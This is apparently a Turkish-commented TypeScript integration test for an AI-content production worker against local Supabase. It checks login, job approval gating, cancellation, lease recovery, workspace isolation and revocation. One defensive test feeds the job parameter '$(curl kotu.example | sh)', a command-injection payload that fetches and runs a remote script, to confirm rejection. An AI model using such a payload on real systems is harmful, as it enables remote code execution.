// Üretim makinesi programının gerçek Supabase'e (CI'daki yerel kurulum) karşı uçtan uca testi.
// Kapsam: giriş → kayıt → kalp atışı → editor sahte iş açar → makine alır → 1. aşamayı yürütür →
// onayda durur → makine oturumu onaylayamaz → editor onaylar → tamamlanır → çıktı bağlanır;
// aşama ortasında iptal; kirası dolan işin geri alınması; ikinci çalışma alanının makinesi işi
// göremez; yetki kaldırılınca makine durur; kodla giriş (`worker:login --code`): panelin ürettiği
// türden tek kullanımlık kod e-posta istemeden oturum açar, makine olarak kaydolur, onay veremez,
// kod ikinci kez kullanılamaz.
// Yerel veriye kullanıcı ve çalışma alanı yazdığı için yalnız WORKER_INTEGRATION=1 ile çalışır.
// Gereksinim: LOCAL_SUPABASE_URL / _ANON_KEY / _SERVICE_ROLE_KEY (yalnız 127.0.0.1 / localhost).
import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';
import { mkdtempSync, rmSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { after, before, test } from 'node:test';
import { setTimeout as delay } from 'node:timers/promises';
import { jobKindCapability } from '@ai-influencer/shared/jobs';
import { createHttp, decodeJwtClaims, type Http } from './lib/api.ts';
import { LoginError, NetworkError, SessionError } from './lib/errors.ts';
import { defaultRegistry } from './lib/handlers.ts';
import { createMemoryLogger } from './lib/log.ts';
import { login } from './lib/login.ts';
import { JOB_KINDS } from './lib/registry.ts';
import type { Session } from './lib/session.ts';
import { createWorkerApi } from './lib/worker-api.ts';
import { createWorker, type ExitReason, type Worker } from './lib/worker.ts';
import { createMemoryStore } from './testing/memory-store.ts';

const enabled = process.env.WORKER_INTEGRATION === '1';
const url = process.env.LOCAL_SUPABASE_URL ?? '';
const anonKey = process.env.LOCAL_SUPABASE_ANON_KEY ?? '';
const serviceKey = process.env.LOCAL_SUPABASE_SERVICE_ROLE_KEY ?? '';
const run = randomUUID().slice(0, 8);
const workDir = mkdtempSync(path.join(os.tmpdir(), 'aiw-integration-'));
const KIND = 'clip.selftest';
const STAGES = JOB_KINDS[KIND].stages;
const CAPABILITY = jobKindCapability(KIND);

interface Reply {
  status: number;
  json: any; // eslint-disable-line @typescript-eslint/no-explicit-any
  text: string;
}

async function rest(
  route: string,
  options: {
    key?: string;
    token?: string;
    method?: string;
    body?: unknown;
    headers?: Record<string, string>;
  } = {},
): Promise<Reply> {
  const key = options.key ?? anonKey;
  const response = await fetch(`${url}${route}`, {
    method: options.method ?? (options.body === undefined ? 'GET' : 'POST'),
    headers: {
      apikey: key,
      Authorization: `Bearer ${options.token ?? key}`,
      'Content-Type': 'application/json',
      ...options.headers,
    },
    ...(options.body === undefined
      ? {}
      : { body: JSON.stringify(options.body) }),
  });
  const text = await response.text();
  let json: unknown = null;
  try {
    json = text ? JSON.parse(text) : null;
  } catch {
    // gövde JSON değil
  }
  return { status: response.status, json, text };
}

interface Person {
  id: string;
  email: string;
  password: string;
  workspaceId: string;
  /** İnsan (panel) oturumunun erişim token'ı. */
  token: string;
}

async function createPerson(label: string): Promise<Person> {
  const email = `worker-it-${label}-${run}@example.test`;
  const password = `it-${randomUUID()}`;
  const created = await rest('/auth/v1/admin/users', {
    key: serviceKey,
    body: { email, password, email_confirm: true },
  });
  assert.equal(
    created.status,
    200,
    `kullanıcı oluşturulamadı: ${created.text}`,
  );
  const workspace = await rest('/rest/v1/rpc/create_workspace_for_user', {
    key: serviceKey,
    body: {
      p_user_id: created.json.id,
      p_name: `Makine testi ${label} ${run}`,
    },
  });
  assert.equal(
    workspace.status,
    200,
    `çalışma alanı açılamadı: ${workspace.text}`,
  );
  const signedIn = await rest('/auth/v1/token?grant_type=password', {
    body: { email, password },
  });
  assert.equal(signedIn.status, 200, 'parolayla giriş başarısız');
  return {
    id: created.json.id,
    email,
    password,
    workspaceId: workspace.json,
    token: signedIn.json.access_token,
  };
}

/** Ağ kesintisini canlandırmak için: kapalıyken her istek ağ hatası verir. */
function switchableHttp(): Http & { online: boolean } {
  const real = createHttp({ supabaseUrl: url, anonKey });
  const guard =
    <A extends unknown[], R>(call: (...args: A) => Promise<R>) =>
    async (...args: A): Promise<R> => {
      if (!wrapped.online) throw new NetworkError('ağ kesik (test)');
      return call(...args);
    };
  const wrapped = {
    online: true,
    sendLoginEmail: guard(real.sendLoginEmail),
    verifyLogin: guard(real.verifyLogin),
    signInWithPassword: guard(real.signInWithPassword),
    refresh: guard(real.refresh),
    logout: guard(real.logout),
    rpc: guard(real.rpc) as Http['rpc'],
    select: guard(real.select) as Http['select'],
    upload: guard(real.upload),
  };
  return wrapped;
}

interface Machine {
  owner: Person;
  http: Http & { online: boolean };
  session: Session;
  workerId: string;
  name: string;
  log: ReturnType<typeof createMemoryLogger>;
}

/**
 * `pnpm worker:login`'in yaptığını yapar: üye olarak (parolayla) giriş, oturumun kasaya yazılması
 * ve `register_worker` ile makine olarak kayıt. Kasa yerine bellek içi kasa kullanılır (CI'da
 * anahtarlık servisi yok); gerçek kasa cli.test.ts'te denenir.
 */
async function signInMachine(owner: Person, name: string): Promise<Machine> {
  const http = switchableHttp();
  const log = createMemoryLogger();
  const store = createMemoryStore();
  const answers = [owner.email, owner.password];
  const next = async () => answers.shift() ?? '';
  const session = await login({
    http,
    store,
    account: 'integration',
    log,
    prompter: { ask: next, askHidden: next },
    say: () => undefined,
    method: 'password',
  });
  // Kayıttan önce oturum sıradan bir üye oturumudur
  const before = await rest('/rest/v1/rpc/is_worker_session', {
    token: await session.accessToken(),
    body: {},
  });
  assert.equal(before.json, false);
  const registered = await createWorkerApi(http, session).registerWorker({
    name,
    platform: 'linux',
    version: '0.0.0-kayit',
    capabilities: [],
  });
  assert.equal(store.items.size, 1, 'oturum kasaya yazılmış olmalı');
  // Parola ve token'lar loglanmaz
  const logged = log.lines.join('\n');
  assert.equal(logged.includes(owner.password), false);
  assert.equal(/eyJ[A-Za-z0-9_-]+\.eyJ/.test(logged), false);
  return { owner, http, session, workerId: registered.id, name, log };
}

function startWorker(machine: Machine): {
  worker: Worker;
  done: Promise<ExitReason>;
} {
  const worker = createWorker({
    api: createWorkerApi(machine.http, machine.session),
    registry: defaultRegistry(),
    log: machine.log,
    name: machine.name,
    platform: 'linux',
    version: '0.0.0-test',
    capabilities: async () => [],
    pollMs: 200,
    heartbeatMs: 500,
    leaseSeconds: 30,
    workDir,
    runner: { progressThrottleMs: 100, renewIntervalMs: 500 },
  });
  return { worker, done: worker.run() };
}

async function enqueue(
  person: Person,
  params: Record<string, unknown>,
): Promise<string> {
  const reply = await rest('/rest/v1/rpc/enqueue_job', {
    token: person.token,
    body: {
      p_module: 'clip',
      p_kind: KIND,
      p_stages: STAGES,
      p_params: params,
      p_required_capabilities: [CAPABILITY],
    },
  });
  assert.equal(reply.status, 200, `iş açılamadı: ${reply.text}`);
  return reply.json.id;
}

async function jobOf(person: Person, jobId: string) {
  const reply = await rest(
    `/rest/v1/jobs?id=eq.${jobId}&select=id,status,current_stage,progress,attempts,worker_id,error,cancel_requested_at,job_stages(key,seq,status,progress,detail,output,error,approved_at,attempts)`,
    { token: person.token },
  );
  assert.equal(reply.status, 200, reply.text);
  const job = reply.json[0];
  if (job)
    job.job_stages.sort(
      (a: { seq: number }, b: { seq: number }) => a.seq - b.seq,
    );
  return job;
}

async function waitFor<T>(
  what: string,
  probe: () => Promise<T | null | undefined | false>,
  timeoutMs = 30_000,
): Promise<T> {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const value = await probe();
    if (value) return value;
    if (Date.now() > deadline) throw new Error(`zaman aşımı: ${what}`);
    await delay(150);
  }
}

const waitStatus = (
  person: Person,
  jobId: string,
  status: string,
  timeoutMs?: number,
) =>
  waitFor(
    `iş ${status} olmalı`,
    async () => {
      const job = await jobOf(person, jobId);
      return job?.status === status ? job : null;
    },
    timeoutMs,
  );

let alice: Person;
let bob: Person;
let machineA: Machine;
let machineB: Machine;
let running: { worker: Worker; done: Promise<ExitReason> } | null = null;
const people: Person[] = [];

before(async () => {
  if (!enabled) return;
  // Uzak bir projeye asla test verisi yazılmaz.
  assert.match(
    url,
    /^http:\/\/(127\.0\.0\.1|localhost)(:\d+)?$/,
    'LOCAL_SUPABASE_URL yerel olmalı',
  );
  alice = await createPerson('a');
  people.push(alice);
  bob = await createPerson('b');
  people.push(bob);
});

after(async () => {
  rmSync(workDir, { recursive: true, force: true });
  if (!enabled) return;
  running?.worker.stop();
  await running?.done.catch(() => undefined);
  for (const person of people) {
    await rest(`/rest/v1/workspaces?id=eq.${person.workspaceId}`, {
      key: serviceKey,
      method: 'DELETE',
    });
    await rest(`/auth/v1/admin/users/${person.id}`, {
      key: serviceKey,
      method: 'DELETE',
    });
  }
});

test(
  'giriş → kayıt → kalp atışı; makine oturumu salt okur',
  { skip: !enabled },
  async () => {
    machineA = await signInMachine(alice, `Makine A ${run}`);

    const token = await machineA.session.accessToken();
    const claims = decodeJwtClaims(token);
    assert.match(
      String(claims.session_id),
      /^[0-9a-f-]{36}$/,
      'gerçek token session_id taşır',
    );
    assert.equal(claims.sub, alice.id);
    assert.notEqual(claims.session_id, decodeJwtClaims(alice.token).session_id);
    assert.equal(
      (await rest('/rest/v1/rpc/is_worker_session', { token, body: {} })).json,
      true,
    );
    assert.equal(
      (
        await rest('/rest/v1/rpc/is_worker_session', {
          token: alice.token,
          body: {},
        })
      ).json,
      false,
    );

    running = startWorker(machineA);
    const row = await waitFor('makine kaydı', async () => {
      const reply = await rest(
        `/rest/v1/production_workers?id=eq.${machineA.workerId}&select=name,platform,version,capabilities,last_seen_at,revoked_at,workspace_id`,
        { token: alice.token },
      );
      const worker = reply.json?.[0];
      return worker?.version === '0.0.0-test' ? worker : null;
    });
    assert.equal(row.name, machineA.name);
    assert.equal(row.workspace_id, alice.workspaceId);
    // İşleyici kaydındaki her tür bildirilir (sıralı)
    assert.deepEqual(row.capabilities, [CAPABILITY, 'kind:explainer.render']);
    // Kalp atışı son görülmeyi ilerletir
    await waitFor('kalp atışı', async () => {
      const reply = await rest(
        `/rest/v1/production_workers?id=eq.${machineA.workerId}&select=last_seen_at`,
        { token: alice.token },
      );
      return (
        Date.parse(reply.json[0].last_seen_at) > Date.parse(row.last_seen_at)
      );
    });

    // Makine oturumu iş açamaz, ekibi göremez
    const refused = await rest('/rest/v1/rpc/enqueue_job', {
      token,
      body: { p_module: 'clip', p_kind: KIND, p_stages: STAGES },
    });
    assert.equal(refused.status, 403);
    assert.equal(refused.json.code, '42501');
    assert.deepEqual(
      (await rest('/rest/v1/team_members?select=user_id', { token })).json,
      [],
    );
  },
);

test(
  'sahte iş uçtan uca: al → yürüt → onayda dur → editor onaylar → tamamla',
  { skip: !enabled },
  async () => {
    const note = `not-${run}`;
    const jobId = await enqueue(alice, { steps: 3, stepMs: 100, note });
    const waiting = await waitStatus(alice, jobId, 'awaiting_approval');
    assert.equal(waiting.current_stage, 'review');
    assert.equal(waiting.worker_id, machineA.workerId);
    assert.deepEqual(
      waiting.job_stages.map((stage: { key: string; status: string }) => [
        stage.key,
        stage.status,
      ]),
      [
        ['prepare', 'succeeded'],
        ['review', 'succeeded'],
        ['finish', 'pending'],
      ],
    );
    assert.match(waiting.job_stages[0].output.node, /^v\d+\./);
    assert.equal(waiting.job_stages[0].progress, 100);
    assert.match(waiting.job_stages[1].detail, /adım 3\/3/);

    // Çıktı yüklendi ve işe bağlandı
    const assets = await rest(
      `/rest/v1/job_assets?job_id=eq.${jobId}&select=role,stage_key,assets(bucket,storage_path,mime_type,file_size_bytes,influencer_id,created_by)`,
      { token: alice.token },
    );
    assert.equal(assets.json.length, 1, assets.text);
    const expectedPath = `${alice.workspaceId}/${jobId}/selftest.txt`;
    assert.deepEqual(assets.json[0], {
      role: 'other',
      stage_key: 'review',
      assets: {
        bucket: 'productions',
        storage_path: expectedPath,
        mime_type: 'text/plain',
        file_size_bytes: waiting.job_stages[1].output.bytes,
        influencer_id: null,
        created_by: alice.id,
      },
    });
    const file = await rest(
      `/storage/v1/object/authenticated/productions/${expectedPath}`,
      {
        token: alice.token,
      },
    );
    assert.equal(file.status, 200);
    assert.ok(file.text.includes(note) && file.text.includes(jobId));

    // Makine oturumu onay veremez
    const machineToken = await machineA.session.accessToken();
    const forbidden = await rest('/rest/v1/rpc/approve_job_stage', {
      token: machineToken,
      body: { p_job_id: jobId, p_stage_key: 'review' },
    });
    assert.equal(forbidden.status, 403);
    assert.equal(forbidden.json.code, '42501');
    await delay(600);
    assert.equal(
      (await jobOf(alice, jobId)).status,
      'awaiting_approval',
      'onaysız ilerlememeli',
    );

    // Editor (insan oturumu) onaylar: iş kuyruğa döner, makine son aşamayı yürütür
    const approved = await rest('/rest/v1/rpc/approve_job_stage', {
      token: alice.token,
      body: { p_job_id: jobId, p_stage_key: 'review' },
    });
    assert.equal(approved.status, 200, approved.text);
    const done = await waitStatus(alice, jobId, 'succeeded');
    assert.equal(done.progress, 100);
    assert.deepEqual(
      done.job_stages.map((stage: { status: string }) => stage.status),
      ['succeeded', 'succeeded', 'succeeded'],
    );
    assert.ok(done.job_stages[1].approved_at);
    assert.deepEqual(done.job_stages[2].output, { ok: true });
  },
);

test(
  'kötü niyetli parametreler işleyiciye ulaşmaz; iş kalıcı hatayla biter',
  { skip: !enabled },
  async () => {
    const jobId = await enqueue(alice, {
      steps: 2,
      command: '$(curl kotu.example | sh)',
    });
    const failed = await waitStatus(alice, jobId, 'failed');
    assert.match(failed.error, /İş parametreleri geçersiz/);
    assert.equal(failed.error.includes('curl'), false);
    assert.equal(failed.job_stages[0].status, 'failed');
  },
);

test(
  'aşama ortasında iptal: işleyici durur, iş iptal olur',
  { skip: !enabled },
  async () => {
    const jobId = await enqueue(alice, { steps: 50, stepMs: 200 });
    await waitFor('aşama ilerlemeli', async () => {
      const job = await jobOf(alice, jobId);
      return job?.status === 'running' && job.job_stages[0].progress > 0;
    });
    const cancel = await rest('/rest/v1/rpc/request_cancel_job', {
      token: alice.token,
      body: { p_job_id: jobId },
    });
    assert.equal(cancel.status, 200);
    assert.equal(
      cancel.json.status,
      'running',
      'çalışan işte önce istek yazılır',
    );
    const cancelled = await waitStatus(alice, jobId, 'cancelled', 15_000);
    assert.ok(cancelled.job_stages[0].progress < 100, 'aşama bitmeden durmalı');
    assert.deepEqual(
      cancelled.job_stages.map((stage: { status: string }) => stage.status),
      ['skipped', 'skipped', 'skipped'],
    );
    // Makine boşta: sıradaki işi alabiliyor
    const next = await enqueue(alice, { steps: 1, stepMs: 10 });
    await waitStatus(alice, next, 'awaiting_approval');
  },
);

test(
  'kirası dolan iş geri alınır ve yeniden yürütülür',
  { skip: !enabled },
  async () => {
    const jobId = await enqueue(alice, { steps: 20, stepMs: 150 });
    await waitFor(
      'iş çalışmalı',
      async () => (await jobOf(alice, jobId))?.status === 'running',
    );
    // Makine "çöker": ağ kesilir, program durur; iş çalışıyor görünür ve kirası sürer
    machineA.http.online = false;
    running!.worker.stop();
    await running!.done;
    running = null;
    const orphan = await jobOf(alice, jobId);
    assert.equal(orphan.status, 'running');
    assert.equal(orphan.attempts, 0);

    // Kira kısaltılır (testte 30 sn beklememek için): service role yalnız kira bitişini yazar
    const shortened = await rest(`/rest/v1/jobs?id=eq.${jobId}`, {
      key: serviceKey,
      method: 'PATCH',
      body: { lease_expires_at: new Date(Date.now() - 1000).toISOString() },
      headers: { Prefer: 'return=minimal' },
    });
    if (shortened.status >= 300) await delay(31_000); // yazılamadıysa kiranın dolmasını bekle

    machineA.http.online = true;
    running = startWorker(machineA);
    const retried = await waitStatus(alice, jobId, 'awaiting_approval', 45_000);
    assert.equal(retried.attempts, 1, 'dolan kira bir deneme sayılır');
    assert.equal(retried.job_stages[0].attempts, 1);
    assert.equal(retried.job_stages[0].status, 'succeeded');
  },
);

test(
  'ikinci çalışma alanının makinesi işi göremez, alamaz, klasörüne yazamaz',
  { skip: !enabled },
  async () => {
    // A'nın makinesi durur; kuyrukta A'nın işi bekler
    running!.worker.stop();
    await running!.done;
    running = null;
    const jobId = await enqueue(alice, { steps: 1, stepMs: 10 });

    machineB = await signInMachine(bob, `Makine B ${run}`);
    const other = startWorker(machineB);
    try {
      // B kendi işini alır ve yürütür
      const own = await enqueue(bob, { steps: 1, stepMs: 10 });
      await waitStatus(bob, own, 'awaiting_approval');
      // A'nın işi yerinde durur
      await delay(1500);
      const untouched = await jobOf(alice, jobId);
      assert.equal(untouched.status, 'queued');
      assert.equal(untouched.worker_id, null);

      const tokenB = await machineB.session.accessToken();
      assert.deepEqual(
        (
          await rest(`/rest/v1/jobs?id=eq.${jobId}&select=id`, {
            token: tokenB,
          })
        ).json,
        [],
        'B makinesi A alanının işini okuyamaz',
      );
      const upload = await fetch(
        `${url}/storage/v1/object/productions/${alice.workspaceId}/${jobId}/sizinti.txt`,
        {
          method: 'POST',
          headers: {
            apikey: anonKey,
            Authorization: `Bearer ${tokenB}`,
            'Content-Type': 'text/plain',
          },
          body: 'x',
        },
      );
      assert.ok(
        upload.status >= 400,
        `başka alana yükleme reddedilmeli (${upload.status})`,
      );
      const attach = await rest('/rest/v1/rpc/attach_job_output', {
        token: tokenB,
        body: {
          p_worker_id: machineB.workerId,
          p_job_id: jobId,
          p_file_name: 'sizinti.txt',
          p_role: 'other',
        },
      });
      assert.ok(attach.status >= 400);
      // B'nin makinesi A'nın makinesi adına konuşamaz
      const impersonate = await rest('/rest/v1/rpc/claim_job', {
        token: tokenB,
        body: { p_worker_id: machineA.workerId },
      });
      assert.ok(impersonate.status >= 400);
    } finally {
      other.worker.stop();
      await other.done;
    }

    // A'nın makinesi dönünce iş yürür
    running = startWorker(machineA);
    await waitStatus(alice, jobId, 'awaiting_approval');
  },
);

test(
  'yetki kaldırılınca makine durur; oturumu ve token’ı ölür',
  { skip: !enabled },
  async () => {
    const tokenBefore = await machineA.session.accessToken();
    const revoked = await rest('/rest/v1/rpc/revoke_worker', {
      token: alice.token,
      body: { p_worker_id: machineA.workerId },
    });
    assert.equal(revoked.status, 200, revoked.text);
    assert.equal(await running!.done, 'revoked');
    running = null;
    // Süresi dolmamış erişim token'ı artık hiçbir satır göremez
    assert.deepEqual(
      (await rest('/rest/v1/jobs?select=id', { token: tokenBefore })).json,
      [],
    );
    assert.deepEqual(
      (
        await rest('/rest/v1/production_workers?select=id', {
          token: tokenBefore,
        })
      ).json,
      [],
    );
    // Yenileme token'ı da ölü: Auth oturumu silindi
    await assert.rejects(machineA.session.forceRefresh(), SessionError);
  },
);

test(
  'kodla giriş: e-posta istenmez; oturum makine olur, onay veremez; kod tek kullanımlık',
  { skip: !enabled },
  async () => {
    const carol = await createPerson('c');
    people.push(carol);
    // Panelin `POST /api/tool-login` ucunun yaptığı çağrının aynısı (yönetici API'si, kullanıcının
    // kendi e-postası); uç yalnız `hashed_token` alanını döndürür. Ucun kendisi panel E2E'sinde
    // denenir (apps/panel/e2e/tool-login.app.spec.ts).
    const minted = await rest('/auth/v1/admin/generate_link', {
      key: serviceKey,
      body: { type: 'magiclink', email: carol.email },
    });
    assert.equal(minted.status, 200, 'giriş kodu üretilemedi');
    assert.equal(minted.json.id, carol.id);
    const code: string = minted.json.hashed_token;

    // `pnpm worker:login --code`: tek gizli soru; e-posta sorulmaz, Auth'tan e-posta istenmez.
    const real = createHttp({ supabaseUrl: url, anonKey });
    const http: Http = {
      ...real,
      sendLoginEmail: async () => assert.fail('kodla girişte e-posta istenmez'),
    };
    const signIn = (store = createMemoryStore(), log = createMemoryLogger()) =>
      login({
        http,
        store,
        account: 'integration-code',
        log,
        prompter: {
          ask: async () => assert.fail('kodla girişte e-posta sorulmaz'),
          askHidden: async () => code,
        },
        say: () => undefined,
        method: 'code',
      });
    const store = createMemoryStore();
    const log = createMemoryLogger();
    const session = await signIn(store, log);
    assert.equal(store.items.size, 1, 'oturum kasaya yazılmış olmalı');
    const token = await session.accessToken();
    assert.equal(decodeJwtClaims(token).sub, carol.id);
    assert.equal(
      (await rest('/rest/v1/rpc/is_worker_session', { token, body: {} })).json,
      false,
      'kayıttan önce sıradan üye oturumu',
    );
    const logged = log.lines.join('\n');
    assert.equal(logged.includes(code), false);
    assert.equal(/eyJ[A-Za-z0-9_-]+\.eyJ/.test(logged), false);

    // Girişten sonraki adım değişmedi: register_worker; oturum artık makinedir ve onay veremez.
    const registered = await createWorkerApi(http, session).registerWorker({
      name: `Makine C ${run}`,
      platform: 'linux',
      version: '0.0.0-kod',
      capabilities: [],
    });
    assert.match(registered.id, /^[0-9a-f-]{36}$/);
    assert.equal(
      (await rest('/rest/v1/rpc/is_worker_session', { token, body: {} })).json,
      true,
    );
    const refused = await rest('/rest/v1/rpc/approve_job_stage', {
      token,
      body: { p_job_id: randomUUID(), p_stage_key: 'review' },
    });
    assert.equal(refused.status, 403);
    assert.equal(refused.json.code, '42501');

    // Tek kullanımlık: aynı kod ikinci kez oturum açmaz ve kasaya bir şey yazmaz.
    const second = createMemoryStore();
    await assert.rejects(signIn(second), LoginError);
    assert.equal(second.items.size, 0);

    await session.logout();
  },
);
